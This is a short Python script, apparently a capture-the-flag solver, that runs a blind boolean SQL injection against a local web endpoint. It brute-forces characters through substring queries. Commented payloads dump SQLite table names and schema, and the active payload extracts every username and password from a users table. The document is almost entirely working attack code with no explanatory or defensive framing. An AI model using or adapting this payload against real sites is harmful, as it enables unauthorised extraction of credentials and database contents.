import requests
flag=''
url ='http://127.0.0.1:5000/home/'
chars= 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ～_'
for j in range(1,100):
	for i in range(len(chars)):
		##payload="(select case when(substr((select group_concat(tbl_name) FROM sqlite_master WHERE type='table'),{0},1))='{1}') then 1 else 4 end)".format(i,chars[i])
		#payload="(select case when substr(sql,{0},1)='{1}' then 1 else 4 end from sqlite_master where type='table')".format(j,chars[i])
		payload="(select case when substr(group_concat(username,password),{0},1)='{1}' then 1 else 4 end from users)".format(j,chars[i])
		response = requests.get(url+payload)
		#print (response.text)
		if('Welcome') in response.text:
			flag+=chars[i]
			print(flag)
		


 